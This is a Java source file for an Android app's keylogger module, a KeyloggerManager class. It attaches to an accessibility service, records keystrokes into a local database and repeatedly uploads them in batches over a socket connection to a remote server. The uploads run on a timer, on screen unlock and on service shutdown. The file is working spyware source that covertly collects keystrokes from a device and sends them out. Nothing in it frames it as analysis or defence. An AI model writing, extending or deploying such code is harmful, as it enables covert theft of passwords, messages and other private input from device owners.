package com.fason.app.features.keylogger;

import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.fason.app.core.FasonAccessibilityService;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import io.socket.client.Socket;

public class KeyloggerManager {
    private static final String TAG = "Keylogger";
    private static volatile KeyloggerManager helperInstance;
    private static volatile FasonAccessibilityService host;
    private static final int SYNC_BATCH_SIZE = 100;
    private static final long SYNC_INTERVAL_MS = 10_000;
    private volatile boolean active = false;
    private volatile Thread syncThread;
    private final java.util.concurrent.atomic.AtomicInteger unsyncedCount = new java.util.concurrent.atomic.AtomicInteger(0);
    private volatile ExecutorService syncExec;
    private final java.util.concurrent.atomic.AtomicBoolean syncInProgress = new java.util.concurrent.atomic.AtomicBoolean(false);
    private final Handler timeoutHandler = new Handler(Looper.getMainLooper());
    private KeystrokeDatabase db;
    private KeyloggerAccessibility a11y;

    public static void onHostConnected(FasonAccessibilityService h) {
        host = h;
        helperInstance = new KeyloggerManager();
        helperInstance.db = KeystrokeDatabase.getInstance(FasonApp.getContext());
        helperInstance.syncExec = Executors.newSingleThreadExecutor();
        helperInstance.a11y = new KeyloggerAccessibility(helperInstance, helperInstance.db);
        Log.i(TAG, "Keylogger attached");
    }

    public static void onHostDisconnected() {
        if (helperInstance != null) {
            final KeyloggerManager mgr = helperInstance;
            mgr.active = false;
            mgr.stopSyncLoop();
            if (mgr.syncExec != null && !mgr.syncExec.isShutdown()) {
                mgr.syncExec.execute(mgr::syncToServer);
                mgr.syncExec.shutdown();
            }
        }
        helperInstance = null;
        host = null;
    }

    public static void onAccessibilityEvent(AccessibilityEvent event) {
        if (helperInstance == null || event == null || !helperInstance.active) return;
        helperInstance.a11y.handleEvent(event);
    }

    public static KeyloggerManager getInstance() {
        return helperInstance;
    }

    public static boolean isServiceConnected() {
        return helperInstance != null;
    }

    public boolean isLocked() {
        return false;
    }

    void onEntryAdded() {
        unsyncedCount.incrementAndGet();
        if (unsyncedCount.get() >= SYNC_BATCH_SIZE) {
            triggerSync();
        }
    }

    public void onScreenStateChanged(boolean screenOn, boolean locked) {
        if (!active || helperInstance == null) return;
        a11y.onScreenStateChanged(screenOn, locked);
        if (screenOn && !locked) {
            triggerSync();
        }
    }

    public void setActive(boolean active) {
        this.active = active;
        if (active) {
            startSyncLoop();
            syncToServer();
        } else {
            stopSyncLoop();
        }
        Log.i(TAG, "Keylogger " + (active ? "activated" : "deactivated"));
    }

    public boolean isActive() {
        return active;
    }

    public int getPendingCount() {
        return db != null ? db.getUnsyncedCount() : 0;
    }

    public int getTotalCount() {
        return db != null ? db.getTotalCount() : 0;
    }

    public JSONArray fetchAll() {
        if (db == null) return new JSONArray();
        return db.getAll(500);
    }

    public JSONArray fetchByType(String eventType) {
        if (db == null) return new JSONArray();
        return db.getAll(500, eventType);
    }

    public void clearBuffer() {
        if (db != null) db.clearAll();
        unsyncedCount.set(0);
        if (a11y != null) a11y.resetState();
    }

    private void triggerSync() {
        if (syncExec != null && !syncExec.isShutdown()) {
            syncExec.execute(this::syncToServer);
        }
    }

    public void syncToServer() {
        if (!syncInProgress.compareAndSet(false, true)) return;
        if (db == null) { syncInProgress.set(false); return; }
        Socket socket = SocketClient.getInstance().getSocket();
        if (socket == null || !socket.connected()) { syncInProgress.set(false); return; }
        try {
            JSONArray keystrokes = db.getUnsynced(SYNC_BATCH_SIZE);
            if (keystrokes.length() == 0) { syncInProgress.set(false); return; }
            final JSONArray dbIds = new JSONArray();
            for (int i = 0; i < keystrokes.length(); i++) {
                JSONObject entry = keystrokes.getJSONObject(i);
                dbIds.put(entry.getLong("dbId"));
                entry.remove("dbId");
            }
            JSONObject payload = new JSONObject();
            payload.put(Protocol.KEY_TYPE, "batch");
            payload.put(Protocol.KEY_KEYSTROKES, keystrokes);
            payload.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            final long syncStartTime = System.currentTimeMillis();
            socket.emit(Protocol.KEYLOGGER, payload, new io.socket.client.Ack() {
                @Override
                public void call(Object... args) {
                    try {
                        db.markSynced(dbIds);
                        int synced = dbIds.length();
                        unsyncedCount.set(Math.max(0, unsyncedCount.get() - synced));
                        Log.d(TAG, "Synced " + synced + " entries");
                    } catch (Exception e) {
                        Log.w(TAG, "markSynced failed", e);
                    } finally {
                        syncInProgress.set(false);
                    }
                }
            });
            timeoutHandler.postDelayed(() -> {
                if (syncInProgress.get() && System.currentTimeMillis() - syncStartTime >= 15000) {
                    Log.w(TAG, "Sync ACK timeout");
                    syncInProgress.set(false);
                }
            }, 15000);
        } catch (Exception e) {
            Log.w(TAG, "Sync failed", e);
            syncInProgress.set(false);
        }
    }

    private void startSyncLoop() {
        stopSyncLoop();
        syncThread = new Thread(() -> {
            while (active && !Thread.interrupted()) {
                try {
                    Thread.sleep(SYNC_INTERVAL_MS);
                    syncToServer();
                } catch (InterruptedException e) {
                    break;
                } catch (Exception e) {
                    Log.w(TAG, "Sync loop error", e);
                }
            }
        }, "KeyloggerSync");
        syncThread.setDaemon(true);
        syncThread.start();
    }

    private void stopSyncLoop() {
        if (syncThread != null) {
            syncThread.interrupt();
            syncThread = null;
        }
    }
}
